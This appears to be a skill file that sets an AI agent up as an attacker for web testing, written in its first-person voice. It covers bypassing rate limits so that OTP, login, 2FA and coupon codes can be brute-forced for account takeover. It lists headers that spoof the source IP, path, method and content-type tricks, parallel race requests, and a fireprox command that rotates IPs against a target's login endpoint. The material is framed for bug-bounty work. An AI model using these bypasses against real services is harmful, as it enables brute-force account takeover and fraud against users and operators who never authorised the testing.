# SKILL: Rate-Limiting Bypass

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (rate-limiting bypass) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Without rate-limit, brute force OTP / login / coupon / 2FA / reset flows = ATO. I exhaust every header / IP rotation / parallel route.

---

## DETECTION
Hit endpoint 100× fast — does it block? After how many?

## EXPLOITATION
### Headers that some APIs honor as the source IP
```
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-ProxyUser-Ip: 1.2.3.4
True-Client-IP: 1.2.3.4
Cluster-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
Forwarded: for=1.2.3.4
X-Original-URL: /endpoint/x
X-Rewrite-URL: /endpoint/x
```

Rotate value per request via Burp Intruder / Turbo Intruder.

### Path tricks
- `/api/login` → `/api/login/`, `/api/login//`, `/api//login`, `/api/./login`
- `/api/login?x=1`, `/api/login;a=b`

### Method swap
- POST → PUT/PATCH (some rate-limit only on POST)

### Different region/host
- `-H "Host: api.target.com"` vs `target.com/api`

### Content-Type swap
- form vs JSON vs XML

### Distributed (multi-IP)
- Use cloud functions / fly.io / fastly compute / VPS pool — each gets fresh IP.

### Race condition / single-packet attack
- 50 parallel reqs may all pass before counter increments.

## PAYLOADS (real, copy-paste, grouped)
(see headers above)

## BYPASS TECHNIQUES
(see exploitation)

## CHAIN POTENTIAL
Rate-limit bypass → OTP brute → ATO; coupon brute → financial; 2FA brute → ATO.

## TOOLS
Turbo Intruder, fireprox (AWS API Gateway IP rotation), proxychains

## COMMANDS
```bash
# fireprox creates AWS API Gateway proxy = IP rotation per request
python3 fireprox.py --command create --url https://target.com/api/login --region us-east-1 --profile_name default
# then send your brute through https://....execute-api.us-east-1.amazonaws.com/fireprox/api/login
```

## EDGE CASES / NOT-A-BUG TRAPS
Account-level rate limits (per user, not IP) cannot be IP-bypassed. Must rotate accounts.

## TRIAGE ANGLE (per platform)
Show 1000 requests in N minutes succeeding (proves bypass).

## SEVERITY & CVSS
Depends on chained bug.

## REFERENCES
ustayready/fireprox • PortSwigger Brute Force
